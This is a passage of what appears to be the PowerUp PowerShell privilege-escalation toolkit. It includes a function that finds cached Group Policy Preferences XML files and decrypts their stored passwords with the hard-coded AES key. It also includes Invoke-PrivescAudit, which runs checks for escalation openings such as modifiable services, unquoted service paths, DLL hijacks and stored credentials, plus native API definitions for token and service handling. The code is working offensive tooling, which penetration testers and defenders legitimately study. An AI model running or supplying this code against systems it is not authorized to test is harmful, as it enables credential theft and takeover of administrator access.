http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>

    [CmdletBinding()]
    Param()

    # Some XML issues between versions
    Set-StrictMode -Version 2

    # make sure the appropriate assemblies are loaded
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core

    # helper that decodes and decrypts password
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $Cpassword
        )

        try {
            # Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)

            # Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            # Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch {
            Write-Error $Error[0]
        }
    }

    # helper that parses fields from the found xml preference files
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)

            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()

            # check for password field
            if ($Xml.innerxml -like "*cpassword*"){

                Write-Verbose "Potential password in $File"

                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                }
           }

           ForEach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }

            # put [BLANK] in variables
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}

            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}

            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) { Return $ResultsObject }
        }

        catch {Write-Error $Error[0]}
    }

    try {
        $AllUsers = $Env:ALLUSERSPROFILE

        if ($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }

        # discover any locally cached GPP .xml files
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

            ForEach ($File in $XMLFiles) {
                Get-GppInnerField $File.Fullname
            }
        }
    }

    catch {
        Write-Error $Error[0]
    }
}


function Invoke-PrivescAudit {
<#
.SYNOPSIS

Executes all functions that check for various Windows privilege escalation opportunities.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Executes all functions that check for various Windows privilege escalation opportunities.

.PARAMETER Format

String. Format to decide on what is returned from the command, an Object Array, List, or HTML Report.

.PARAMETER HTMLReport

DEPRECATED - Switch. Write a HTML version of the report to SYSTEM.username.html. 
Superseded by the Format parameter.

.EXAMPLE

Invoke-PrivescAudit

Runs all escalation checks and outputs a status report for discovered issues.

.EXAMPLE

Invoke-PrivescAudit -Format HTML

Runs all escalation checks and outputs a status report to SYSTEM.username.html
detailing any discovered issues.

#>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [ValidateSet('Object','List','HTML')]
        [String]
        $Format = 'List',

        [Switch]
        $HTMLReport
    )

    if($HTMLReport){ $Format = 'HTML' }

    if ($Format -eq 'HTML') {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"
        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    Write-Host "[+] Running Invoke-PrivescAudit"
    Write-Host "[+] Enumerating services. This may take some time... "

    # All service checks operate on an array of PowerUp.Service objects. We only obtain this array once to improve efficiency.
    # That beeing said, the obtain the Service array in three different ways, merge the results and then filter unique service
    # objects. This way, chances of missing a vulnerable service get reduced.
    Write-Host "[+]     Enumerating services via registry... " -NoNewline
    $S1 = Get-ServiceReg
    Write-Host "done. [$($S1.Length) services found]"

    Write-Host "[+]     Enumerating services via WMI... " -NoNewline
    $S2 = Get-ServiceWmi
    Write-Host "done. [$($S2.Length) services found]"

    Write-Host "[+]     Enumerating services via Advapi32... " -NoNewline
    $S3 = Get-ServiceApi
    Write-Host "done. [$($S3.Length) services found]"

    $Services = $S1 + $S2 + $S3
    $Services = $Services | Group-Object "Name","Dacl" | ForEach-Object {$_.Group | Select -First 1}

    Write-Host "[+] $($Services.Length) unique services identified."
    Write-Host "[+] Running Privilege Escalation Checks.`n"

    $Checks = @(
        @{
            Type    = 'User Has Local Admin Privileges'
            Command = { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){ New-Object PSObject } }
        },
        @{
            Type        = 'User In Local Group with Admin Privileges'
            Command     = { if ((Get-ProcessTokenGroup | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { Get-ProcessTokenPrivilege -Special | Where-Object {$_} }
        },
        @{
            Type    = 'Unquoted Service Paths'
            Command = { $Services | Get-UnquotedService }
        },
        @{
            Type    = 'Modifiable Service Files'
            Command = { $Services | Get-ModifiableServiceFile }
        },
        @{
            Type    = 'Modifiable Services'
            Command = { $Services | Test-ServiceDaclPermission }
        },
        @{
            Type        = '%PATH% .dll Hijacks'
            Command     = { Find-PathDLLHijack }
        },
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (Get-RegistryAlwaysInstallElevated){ New-Object PSObject } }
        },
        @{
            Type    = 'Registry Autologons'
            Command = { Get-RegistryAutoLogon }
        },
        @{
            Type    = 'Modifiable Registry Autorun'
            Command = { Get-ModifiableRegistryAutoRun }
        },
        @{
            Type    = 'Modifiable Scheduled Task Files'
            Command = { Get-ModifiableScheduledTaskFile }
        },
        @{
            Type    = 'Modifiable Scheduled Task Files2'
            Command = { Get-ScheduledTasks | Get-ModifiableScheduledTaskFile2 }
        },
        @{
            Type    = 'Unattended Install Files'
            Command = { Get-UnattendedInstallFile }
        },
        @{
            Type    = 'Encrypted web.config Strings'
            Command = { Get-WebConfig | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { Get-ApplicationHost | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { Get-SiteListPassword | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { Get-CachedGPPPassword | Where-Object {$_} }
        },
        @{
            Type    = 'Modifiable Registry Service Keys'
            Command = { Get-ModifiableRegistryService }
        }
    )

    ForEach($Check in $Checks){
        if( $PSBoundParameters['Verbose'] ) {
            $Results = . $Check.Command -Verbose
        } else {
            $Results = . $Check.Command
        }
        $Results | Where-Object {$_} | ForEach-Object {
            $_ | Add-Member Noteproperty 'Check' $Check.Type -Force
        }
        switch($Format){
            Object { $Results }
            List   { "[*] Checking for $($Check.Type)..."; $Results | Format-List }
            HTML   { $Results | ConvertTo-HTML -Head $Header -Body "<H2>$($Check.Type)</H2>" | Out-File -Append $HtmlReportFile }
        }
    }

    if ($Format -eq 'HTML') {
        Write-Verbose "[*] Report written to '$HtmlReportFile' `n"
    }
}


# PSReflect signature specifications
$Module = New-InMemoryModule -ModuleName PowerUpModule
# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', '', Scope='Function')]

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Bool]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceConfig ([Bool]) @([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError -Charset Unicode),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
)

# https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig             =   '0x00000001'
    ChangeConfig            =   '0x00000002'
    QueryStatus             =   '0x00000004'
    EnumerateDependents     =   '0x00000008'
    Start                   =   '0x00000010'
    Stop                    =   '0x00000020'
    PauseContinue           =   '0x00000040'
    Interrogate             =   '0x00000080'
    UserDefinedControl      =   '0x00000100'
    Delete                  =   '0x00010000'
    ReadControl             =   '0x00020000'
    WriteDac                =   '0x00040000'
    WriteOwner              =   '0x00080000'
    Synchronize             =   '0x00100000'
    AccessSystemSecurity    =   '0x01000000'
    GenericAll              =   '0x10000000'
    GenericExecute          =   '0x20000000'
    GenericWrite            =   '0x40000000'
    GenericRead             =   '0x80000000'
    AllAccess               =   '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_MANDATORY              =   '0x00000001'
    SE_GROUP_ENABLED_BY_DEFAULT     =   '0x00000002'
    SE_GROUP_ENABLED                =   '0x00000004'
    SE_GROUP_OWNER                  =   '0x00000008'
    SE_GROUP_USE_FOR_DENY_ONLY      =   '0x00000010'
    SE_GROUP_INTEGRITY              =   '0x00000020'
    SE_GROUP_RESOURCE               =   '0x20000000'
    SE_GROUP_INTEGRITY_ENABLED      =   '0xC0000000'
} -Bitfield

$LuidAttributes = psenum $Module PowerUp.LuidAttributes UInt32 @{
    DISABLED                            =   '0x00000000'
    SE_PRIVILEGE_ENABLED_BY_DEFAULT     =   '0x00000001'
    SE_PRIVILEGE_ENABLED                =   '0x00000002'
    SE_PRIVILEGE_REMOVED                =   '0x00000004'
    SE_PRIVILEGE_USED_FOR_ACCESS        =   '0x80000000'
} -Bitfield

$SecurityEntity = psenum $Module PowerUp.SecurityEntity UInt32 @{
    SeCreateTokenPrivilege              =   1
    SeAssignPrimaryTokenPrivilege       =   2
    SeLockMemoryPrivilege               =   3
    SeIncreaseQuotaPrivilege            =   4
    SeUnsolicitedInputPrivilege         =   5
    SeMachineAccountPrivilege           =   6
    SeTcbPrivilege                      =   7
    SeSecurityPrivilege                 =   8
    SeTakeOwnershipPrivilege            =   9
    SeLoadDriverPrivilege               =   10
    SeSystemProfilePrivilege            =   11
    SeSystemtimePrivilege               =   12
    SeProfileSingleProcessPrivilege     =   13
    SeIncreaseBasePriorityPrivilege     =   14
    SeCreatePagefilePrivilege           =   15
    SeCreatePermanentPrivilege          =   16
    SeBackupPrivilege                   =   17
    SeRestorePrivilege                  =   18
    SeShutdownPrivilege                 =   19
    SeDebugPrivilege                    =   20
    SeAuditPrivilege                    =   21
    SeSystemEnvironmentPrivilege        =   22
    SeChangeNotifyPrivilege             =   23
    SeRemoteShutdownPrivilege           =   24
    SeUndockPrivilege                   =   25
    SeSyncAgentPrivilege                =   26
    SeEnableDelegationPrivilege         =   27
    SeManageVolumePrivilege             =   28
    SeImpersonatePrivilege              =   29
    SeCreateGlobalPrivilege             =   30
    SeTrustedCredManAccessPrivilege     =   31
    SeRelabelPrivilege                  =   32
    SeIncreaseWorkingSetPrivilege       =   33
    SeTimeZonePrivilege                 =   34
    SeCreateSymbolicLinkPrivilege       =   35
}

$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_TYPE_ENUM = psenum $Module PowerUp.TokenTypeEnum UInt32 @{
    Primary         = 1
    Impersonation   = 2
}

$TOKEN_TYPE = struct $Module PowerUp.TokenType @{
    Type  = field 0 $TOKEN_TYPE_ENUM
}

$SECURITY_IMPERSONATION_LEVEL_ENUM = psenum $Module PowerUp.ImpersonationLevelEnum UInt32 @{
    Anonymous         =   0
    Identification    =   1
    Impersonation     =   2
    Delegation        =   3
}

$IMPERSONATION_LEVEL = struct $Module PowerUp.ImpersonationLevel @{
    ImpersonationLevel  = field 0 $SECURITY_IMPERSONATION_LEVEL_ENUM
}

$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$LUID = struct $Module PowerUp.Luid @{
    LowPart         =   field 0 $SecurityEntity
    HighPart        =   field 1 Int32
}

$LUID_AND_ATTRIBUTES = struct $Module PowerUp.LuidAndAttributes @{
    Luid         =   field 0 $LUID
    Attributes   =   field 1 UInt32
}

$TOKEN_PRIVILEGES = struct $Module PowerUp.TokenPrivileges @{
    PrivilegeCount  = field 0 UInt32
    Privileges      = field 1 $LUID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 50)
}

$SERVICE_INFORMATION = struct $Module PowerUp.ServiceInformation @{
        dwServiceType       = field 0 Uint32
        dwStartType         = field 1 Uint32
        dwErrorControl      = field 2 Uint32
        lpBinaryPathName    = field 3 String -MarshalAs LPWSt
        lpLoadOrderGroup    = field 4 String -MarshalAs LPWSt
        dwTagID             = field 5 Uint32
        lpDependencies      = field 6 String -MarshalAs LPWSt
        lpServiceStartName  = field 7 String -MarshalAs LPWSt
        lpDisplayName       = field 8 String -MarshalAs LPWSt
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$NTDll    = $Types['ntdll']

Set-Alias Get-CurrentUserTokenGroupSid Get-ProcessTokenGroup
Set-Alias Invoke-AllChecks Invoke-PrivescAudit
